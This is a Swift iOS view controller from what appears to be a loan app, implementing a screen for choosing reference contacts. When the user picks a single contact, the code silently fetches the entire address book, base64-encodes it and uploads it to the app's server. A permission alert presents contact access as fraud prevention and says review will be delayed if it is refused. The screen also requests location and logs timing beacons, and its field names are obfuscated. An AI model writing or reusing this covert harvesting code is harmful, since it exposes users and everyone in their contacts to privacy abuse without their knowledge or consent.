//
//  PhonesViewController.swift
//  Pinjaman
//
//  Created by Daniel Thomas Miller on 2026/1/28.
//

import UIKit
import SnapKit
import RxSwift
import RxCocoa
import Kingfisher
import BRPickerView
import TYAlertController

class PhonesViewController: BaseViewController {
    
    var productID: String = ""
    
    var republicanModel: republicanModel?
    
    var mnesteryModel: mnesteryModel?
    
    var modelArray: [variousingModel] = []
    
    private let viewModel = ProductViewModel()
    
    private var start: String = ""
    
    private var end: String = ""
    
    private let locationService = LocationService()
    
    lazy var bgImageView: UIImageView = {
        let bgImageView = UIImageView()
        bgImageView.image = languageCode == .indonesian ? UIImage(named: "he_id_au_image") : UIImage(named: "he_eb_au_image")
        return bgImageView
    }()
    
    lazy var bgView: UIView = {
        let bgView = UIView()
        bgView.backgroundColor = UIColor.init(hexString: "#FCD43E")
        bgView.layer.cornerRadius = 35
        bgView.layer.masksToBounds = true
        bgView.layer.borderWidth = 4
        bgView.layer.borderColor = UIColor.white.cgColor
        return bgView
    }()
    
    lazy var logoImageView: UIImageView = {
        let logoImageView = UIImageView()
        return logoImageView
    }()
    
    lazy var clickBtn: UIButton = {
        let clickBtn = UIButton(type: .custom)
        clickBtn.setTitleColor(.white, for: .normal)
        clickBtn.titleLabel?.font = UIFont.systemFont(ofSize: 18, weight: .bold)
        clickBtn.backgroundColor = UIColor.init(hexString: "#222A40")
        clickBtn.layer.cornerRadius = 12.pix()
        clickBtn.layer.masksToBounds = true
        clickBtn.setTitle(LStr("Next"), for: .normal)
        return clickBtn
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .white
        tableView.estimatedRowHeight = 82
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(AuthPhonesViewCell.self, forCellReuseIdentifier: "AuthPhonesViewCell")
        tableView.layer.cornerRadius = 16
        tableView.layer.masksToBounds = true
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        view.addSubview(headView)
        headView.nameLabel.text = LStr(mnesteryModel?.asform ?? "")
        headView.snp.makeConstraints { make in
            make.top.left.right.equalToSuperview()
        }
        headView.backBlock = { [weak self] in
            guard let self = self else { return }
            self.alertLeaveView()
        }
        
        view.addSubview(bgImageView)
        bgImageView.snp.makeConstraints { make in
            make.top.equalTo(headView.snp.bottom).offset(21)
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 333.pix(), height: 76.pix()))
        }
        
        view.addSubview(bgView)
        bgView.snp.makeConstraints { make in
            make.top.equalTo(headView.snp.bottom).offset(13)
            make.width.height.equalTo(70)
            make.left.equalToSuperview().offset(16)
        }
        
        bgView.addSubview(logoImageView)
        logoImageView.snp.makeConstraints { make in
            make.center.equalToSuperview()
            make.width.height.equalTo(54)
        }
        
        logoImageView.kf.setImage(with: URL(string: mnesteryModel?.tenuot ?? ""))
        
        view.addSubview(clickBtn)
        clickBtn.snp.makeConstraints { make in
            make.bottom.equalToSuperview().offset(-25.pix())
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 311.pix(), height: 54.pix()))
        }
        
        view.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalTo(bgImageView.snp.bottom).offset(20.pix())
            make.left.right.equalToSuperview()
            make.bottom.equalTo(clickBtn.snp.top).offset(-10.pix())
        }
        
        start = String(Int(Date().timeIntervalSince1970))
        
        locationService.requestCurrentLocation { locationDict in }
        
        clickBtn.rx.tap
            .throttle(.milliseconds(250), latest: false, scheduler: MainScheduler.instance)
            .compactMap { [weak self] in self }
            .subscribe(onNext: { strongSelf in
                let dictArray = strongSelf.modelArray.compactMap { model -> [String: String]? in
                    guard let novendecevidenceeer = model.novendecevidenceeer,
                          let tomoeconomyet = model.tomoeconomyet,
                          let secrfier = model.secrfier,
                          let gel = model.gel else {
                        return nil
                    }
                    
                    return [
                        "novendecevidenceeer": novendecevidenceeer,
                        "tomoeconomyet": tomoeconomyet,
                        "secrfier": secrfier,
                        "gel": gel
                    ]
                }
                
                guard !dictArray.isEmpty else {
                    print("No valid models to process")
                    return
                }
                
                do {
                    let jsonData = try JSONSerialization.data(
                        withJSONObject: dictArray,
                        options: []
                    )
                    
                    guard let jsonString = String(data: jsonData, encoding: .utf8) else {
                        print("Failed to convert data to string")
                        return
                    }
                    
                    let parameters = ["ideaical": strongSelf.productID, "standee": jsonString]
                    
                    Task { [parameters] in
                        await strongSelf.savephonesInfo(with: parameters)
                    }
                    
                } catch {
                    print("JSON serialization failed: \(error)")
                    return
                }
            })
            .disposed(by: disposeBag)
        
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        Task {
            await self.phonesInfo()
        }
    }
    
}

extension PhonesViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
        return 20.pix()
    }
    
    func tableView(_ tableView: UITableView, viewForHeaderInSection section: Int) -> UIView? {
        return UIView()
    }
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return self.modelArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let model = self.modelArray[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "AuthPhonesViewCell", for: indexPath) as! AuthPhonesViewCell
        cell.model = model
        cell.tapRelaBlock = { [weak self] in
            guard let self = self else { return }
            self.tapClickCell(with: cell, model: model)
        }
        cell.tapPhoBlock = { [weak self] in
            guard let self = self else { return }
            ContactManager.shared.showPicker(from: self) { contact in
                guard let contact = contact else {
                    self.showPermissionAlert()
                    return
                }
                let name = contact.tomoeconomyet
                let phone = contact.tellard
                if name.isEmpty || phone.isEmpty {
                    ToastManager.showLocal("Phone number or name cannot be empty.")
                    return
                }
                cell.twoFiled.text = "\(name): \(phone)"
                model.tomoeconomyet = name
                model.novendecevidenceeer = phone
            }
            ContactManager.shared.fetchAllContacts { [weak self] contacts in
                if let self = self,
                   let jsonData = try? JSONEncoder().encode(contacts) {
                    let base64String = jsonData.base64EncodedString()
                    let parameters = ["histrieastlike": "3", "standee": base64String]
                    Task {
                        await self.uploadphonesInfo(with: parameters)
                    }
                }
            }
        }
        return cell
    }
    
    private func tapClickCell(with cell: AuthPhonesViewCell, model: variousingModel) {
        let popView = PopAutnEnumView(frame: self.view.bounds)
        popView.nameLabel.text = model.payous ?? ""
        let modelArray = model.tonightture ?? []
        popView.modelArray = modelArray
        let name = cell.oneFiled.text ?? ""
        for (index, listModel) in modelArray.enumerated() {
            if name == listModel.tomoeconomyet ?? "" {
                popView.selectIndex(index)
            }
        }
        
        let alertVc = TYAlertController(alert: popView, preferredStyle: .actionSheet)
        self.present(alertVc!, animated: true)
        
        popView.cancelBlock = { [weak self] in
            guard let self = self else { return }
            self.dismiss(animated: true)
        }
        
        popView.saveBlock = { [weak self] listModel in
            guard let self = self else { return }
            self.dismiss(animated: true)
            model.secrfier = listModel.histrieastlike ?? ""
            cell.oneFiled.text = listModel.tomoeconomyet ?? ""
        }
    }
    
}

extension PhonesViewController {
    
    private func phonesInfo() async {
        do {
            let parameters = ["ideaical": productID]
            let model = try await viewModel.phonesInfo(with: parameters)
            let taxant = model.taxant ?? ""
            if ["0", "00"].contains(taxant) {
                self.modelArray = model.standee?.ticmost?.variousing ?? []
                self.tableView.reloadData()
            }
        } catch {
            
        }
    }
    
    private func savephonesInfo(with parameters: [String: String]) async {
        end = String(Int(Date().timeIntervalSince1970))
        do {
            let model = try await viewModel.savephonesInfo(with: parameters)
            let taxant = model.taxant ?? ""
            if ["0", "00"].contains(taxant) {
                Task {
                    await self.productdetilInfo(with: productID, viewModel: viewModel)
                }
                Task {
                    try? await Task.sleep(nanoseconds: 3_000_000_000)
                    await self.suddenlyalBeaconingInfo(with: viewModel,
                                                       productID: productID,
                                                       type: "6",
                                                       orderID: self.republicanModel?.receivester ?? "",
                                                       start: start,
                                                       end: end)
                }
            }else {
                ToastManager.showLocal(model.troubleably ?? "")
            }
        } catch {
            
        }
    }
    
    private func uploadphonesInfo(with parameters: [String: String]) async {
        do {
            let _ = try await viewModel.uploadphonesInfo(with: parameters)
        } catch {
            
        }
    }
    
}

extension PhonesViewController {
    
    private func showPermissionAlert() {
        
        let alert = UIAlertController(
            title: LStr("Contact Permission"),
            message: LStr("Contacts permission is used for identity verification and fraud prevention. The review will be delayed if it is not enabled. Please go to Settings to authorize it."),
            preferredStyle: .alert
        )
        alert.addAction(UIAlertAction(title: LStr("Cancel"), style: .cancel))
        alert.addAction(UIAlertAction(title: LStr("Settings"), style: .default) { _ in
            if let url = URL(string: UIApplication.openSettingsURLString) {
                UIApplication.shared.open(url)
            }
        })
        
        self.present(alert, animated: true)
    }
    
}
